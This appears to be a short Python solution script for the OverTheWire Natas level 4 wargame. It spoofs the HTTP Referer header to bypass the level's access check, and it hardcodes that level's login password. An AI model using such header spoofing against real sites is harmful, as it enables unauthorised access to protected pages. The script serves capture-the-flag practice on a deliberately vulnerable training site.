import requests
from requests.auth import HTTPBasicAuth
r = "http://natas5.natas.labs.overthewire.org/"

req = requests.get("http://natas4.natas.labs.overthewire.org/",\
	 headers={'referer': r}, auth = HTTPBasicAuth('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'))
print(req.text)